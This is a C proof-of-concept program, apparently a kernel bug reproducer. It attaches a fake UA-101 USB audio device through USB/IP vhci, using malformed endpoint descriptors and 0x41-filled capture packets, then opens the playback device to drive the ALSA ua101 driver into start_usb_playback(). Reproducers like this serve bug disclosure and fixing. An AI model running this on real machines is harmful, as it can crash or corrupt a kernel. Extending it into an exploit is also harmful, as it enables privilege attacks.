// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/sysmacros.h>

#define USBIP_CMD_SUBMIT 0x0001
#define USBIP_CMD_UNLINK 0x0002
#define USBIP_RET_SUBMIT 0x0003
#define USBIP_RET_UNLINK 0x0004
#define USBIP_DIR_OUT 0
#define USBIP_DIR_IN  1

#define HDRSZ 48

static int g_sock = -1;

static unsigned int rd32(const unsigned char *p)
{
	return ((unsigned int)p[0] << 24) | ((unsigned int)p[1] << 16) |
	       ((unsigned int)p[2] << 8) | (unsigned int)p[3];
}
static void wr32(unsigned char *p, unsigned int v)
{
	p[0] = v >> 24; p[1] = v >> 16; p[2] = v >> 8; p[3] = v;
}

static int readn(int fd, void *buf, size_t n)
{
	size_t done = 0;
	while (done < n) {
		ssize_t r = read(fd, (char *)buf + done, n - done);
		if (r <= 0) {
			if (r < 0 && errno == EINTR)
				continue;
			return -1;
		}
		done += r;
	}
	return 0;
}
static int writen(int fd, const void *buf, size_t n)
{
	size_t done = 0;
	while (done < n) {
		ssize_t r = write(fd, (const char *)buf + done, n - done);
		if (r <= 0) {
			if (r < 0 && errno == EINTR)
				continue;
			return -1;
		}
		done += r;
	}
	return 0;
}

#define EP_PLAYBACK	0x01
#define EP_CAPTURE	0x82
#define EP_MIDI_OUT	0x03
#define EP_MIDI_IN	0x84

#define CAPTURE_MAXP	512
#define PLAYBACK_MAXP	8

#define CAPTURE_CHANNELS	2
#define PLAYBACK_CHANNELS	8
#define SUBFRAME_SIZE		4

static const unsigned char dev_desc[18] = {
	18,
	0x01,
	0x00, 0x02,
	0x00,
	0x00,
	0x00,
	64,
	0x82, 0x05,
	0x7d, 0x00,
	0x00, 0x01,
	0x00, 0x00, 0x00,
	0x01
};

#define CFG_TOTAL 122
static const unsigned char cfg_desc[CFG_TOTAL] = {

	9, 0x02, CFG_TOTAL & 0xff, CFG_TOTAL >> 8, 3, 1, 0, 0x80, 50,

	9, 0x04, 0, 0, 0, 0x01, 0x02, 0x00, 0,

	9, 0x04, 0, 1, 1, 0x01, 0x02, 0x00, 0,

	7, 0x24, 0x01, 0x01, 0x01, 0x01, 0x00,

	11, 0x24, 0x02,
	0x01,
	PLAYBACK_CHANNELS,
	SUBFRAME_SIZE,
	24,
	1,
	0x80, 0xbb, 0x00,

	9, 0x05, EP_PLAYBACK, 0x05,
	PLAYBACK_MAXP & 0xff, PLAYBACK_MAXP >> 8, 1, 0, 0,

	9, 0x04, 1, 0, 0, 0x01, 0x02, 0x00, 0,

	9, 0x04, 1, 1, 1, 0x01, 0x02, 0x00, 0,
	7, 0x24, 0x01, 0x02, 0x01, 0x01, 0x00,
	11, 0x24, 0x02,
	0x01,
	CAPTURE_CHANNELS,
	SUBFRAME_SIZE,
	24,
	1,
	0x80, 0xbb, 0x00,

	9, 0x05, EP_CAPTURE, 0x05,
	CAPTURE_MAXP & 0xff, CAPTURE_MAXP >> 8, 1, 0, 0,

	9, 0x04, 2, 0, 2, 0x01, 0x03, 0x00, 0,
	7, 0x05, EP_MIDI_OUT, 0x02, 0x00, 0x02, 0,
	7, 0x05, EP_MIDI_IN,  0x02, 0x00, 0x02, 0
};

static unsigned char cur_config;
static unsigned char cur_alt[4];

static void send_ret_submit(unsigned int seq, int status, const void *data,
			    int len, int np, const void *isodesc)
{
	unsigned char hdr[HDRSZ];

	memset(hdr, 0, sizeof(hdr));
	wr32(hdr + 0, USBIP_RET_SUBMIT);
	wr32(hdr + 4, seq);
	wr32(hdr + 8, 0);
	wr32(hdr + 12, 0);
	wr32(hdr + 16, 0);
	wr32(hdr + 20, (unsigned int)status);
	wr32(hdr + 24, (unsigned int)len);
	wr32(hdr + 28, 0);
	wr32(hdr + 32, (unsigned int)np);
	wr32(hdr + 36, 0);

	if (writen(g_sock, hdr, HDRSZ) < 0)
		return;
	if (len > 0 && data)
		writen(g_sock, data, len);
	if (np > 0 && isodesc)
		writen(g_sock, isodesc, 16 * np);
}

static void handle_control(unsigned int seq, const unsigned char *setup,
			   int buflen)
{
	unsigned int bmRT = setup[0], bReq = setup[1];
	unsigned int wValue = setup[2] | (setup[3] << 8);
	unsigned int wIndex = setup[4] | (setup[5] << 8);
	unsigned int wLength = setup[6] | (setup[7] << 8);
	unsigned char tmp[4];
	const unsigned char *src = NULL;
	int srclen = 0;

	if (wLength > (unsigned)buflen)
		wLength = buflen;

	if (bmRT & 0x80) {
		switch (bReq) {
		case 0x06:
			switch (wValue >> 8) {
			case 1:
				src = dev_desc; srclen = sizeof(dev_desc);
				break;
			case 2:
				src = cfg_desc; srclen = sizeof(cfg_desc);
				break;
			default:
				send_ret_submit(seq, -32 , NULL, 0, 0, NULL);
				return;
			}
			break;
		case 0x00:
			tmp[0] = 0x01; tmp[1] = 0x00;
			src = tmp; srclen = 2;
			break;
		case 0x08:
			tmp[0] = cur_config;
			src = tmp; srclen = 1;
			break;
		case 0x0a:
			tmp[0] = (wIndex < 4) ? cur_alt[wIndex] : 0;
			src = tmp; srclen = 1;
			break;
		default:
			send_ret_submit(seq, -32, NULL, 0, 0, NULL);
			return;
		}
		if (srclen > (int)wLength)
			srclen = wLength;
		send_ret_submit(seq, 0, src, srclen, 0, NULL);
		return;
	}

	switch (bReq) {
	case 0x09:
		cur_config = wValue & 0xff;
		memset(cur_alt, 0, sizeof(cur_alt));
		break;
	case 0x0b:
		if (wIndex < 4)
			cur_alt[wIndex] = wValue & 0xff;
		break;
	default:
		break;
	}
	send_ret_submit(seq, 0, NULL, 0, 0, NULL);
}

static unsigned char capture_payload[CAPTURE_MAXP];

static void handle_capture_iso(unsigned int seq, int buflen, int np)
{
	unsigned char iso[16];
	int len = CAPTURE_MAXP;

	if (len > buflen)
		len = buflen;
	if (np != 1) {
		send_ret_submit(seq, -32, NULL, 0, 0, NULL);
		return;
	}
	wr32(iso + 0, 0);
	wr32(iso + 4, len);
	wr32(iso + 8, len);
	wr32(iso + 12, 0);

	send_ret_submit(seq, 0, capture_payload, len, 1, iso);
}

static void *server_thread(void *arg)
{
	static unsigned char obuf[70000];
	static unsigned char isobuf[16 * 1024];
	unsigned char hdr[HDRSZ];

	for (;;) {
		if (readn(g_sock, hdr, HDRSZ) < 0)
			break;

		unsigned int cmd = rd32(hdr + 0);
		unsigned int seq = rd32(hdr + 4);
		unsigned int dir = rd32(hdr + 12);
		unsigned int ep = rd32(hdr + 16);

		if (cmd == USBIP_CMD_UNLINK) {
			unsigned char rhdr[HDRSZ];
			memset(rhdr, 0, sizeof(rhdr));
			wr32(rhdr + 0, USBIP_RET_UNLINK);
			wr32(rhdr + 4, seq);
			wr32(rhdr + 20, (unsigned int)-104);
			writen(g_sock, rhdr, HDRSZ);
			continue;
		}
		if (cmd != USBIP_CMD_SUBMIT)
			break;

		int buflen = (int)rd32(hdr + 24);
		int np = (int)rd32(hdr + 32);
		unsigned char setup[8];
		memcpy(setup, hdr + 40, 8);

		if (dir == USBIP_DIR_OUT && buflen > 0) {
			int n = buflen;
			if (n > (int)sizeof(obuf))
				n = sizeof(obuf);
			if (readn(g_sock, obuf, n) < 0)
				break;
		}
		if (np > 0) {
			int n = 16 * np;
			if (n > (int)sizeof(isobuf))
				n = sizeof(isobuf);
			if (readn(g_sock, isobuf, n) < 0)
				break;
		}

		if (ep == 0) {
			handle_control(seq, setup, buflen);
		} else if (ep == (EP_CAPTURE & 0x0f) && dir == USBIP_DIR_IN) {
			handle_capture_iso(seq, buflen, np);
		} else {

		}
	}
	return NULL;
}

static int card_is_ua101(int card)
{
	char path[64], buf[64];
	int fd, n;

	snprintf(path, sizeof(path), "/proc/asound/card%d/id", card);
	fd = open(path, O_RDONLY);
	if (fd < 0)
		return 0;
	n = read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (n <= 0)
		return 0;
	buf[n] = 0;
	return strncmp(buf, "UA101", 5) == 0;
}

static int open_pcm_playback(void)
{
	char path[64];
	int card, fd;

	for (card = 0; card < 8; card++) {
		if (!card_is_ua101(card))
			continue;
		snprintf(path, sizeof(path), "/dev/snd/pcmC%dD0p", card);
		fd = open(path, O_WRONLY | O_NONBLOCK);
		if (fd >= 0) {
			printf("[+] opened %s (ua101 card %d)\n", path, card);
			return fd;
		}
		printf("[-] card %d is ua101 but open(%s) failed: %s\n",
		       card, path, strerror(errno));
	}
	return -1;
}

static void dump_cards(void)
{
	char buf[512];
	int fd, n;

	fd = open("/proc/asound/cards", O_RDONLY);
	if (fd < 0)
		return;
	printf("[i] /proc/asound/cards:\n");
	while ((n = read(fd, buf, sizeof(buf) - 1)) > 0) {
		buf[n] = 0;
		fputs(buf, stdout);
	}
	close(fd);
}

int main(void)
{
	int sv[2];
	pthread_t th;
	char buf[128];
	int fd, i;

	setvbuf(stdout, NULL, _IONBF, 0);

	memset(capture_payload, 0x41, sizeof(capture_payload));

	if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
		perror("socketpair");
		return 1;
	}
	g_sock = sv[1];

	if (pthread_create(&th, NULL, server_thread, NULL) != 0) {
		perror("pthread_create");
		return 1;
	}

	fd = open("/sys/devices/platform/vhci_hcd.0/attach", O_WRONLY);
	if (fd < 0) {
		perror("open vhci attach");
		return 1;
	}

	snprintf(buf, sizeof(buf), "%u %u %u %u", 0, sv[0], 0x00010002u, 3u);
	if (write(fd, buf, strlen(buf)) < 0) {
		perror("write attach");
		return 1;
	}
	close(fd);
	printf("[+] virtual UA-101 attached\n");

	for (i = 0; i < 400; i++) {
		int pfd = open_pcm_playback();
		if (pfd >= 0) {
			printf("[*] opening playback PCM -> start_usb_playback()\n");

			sleep(3);
			close(pfd);
			break;
		}
		usleep(50000);
	}

	if (i >= 400) {
		printf("[-] no ua101 PCM device appeared\n");
		dump_cards();
	}
	printf("[*] done\n");
	sleep(3);
	return 0;
}
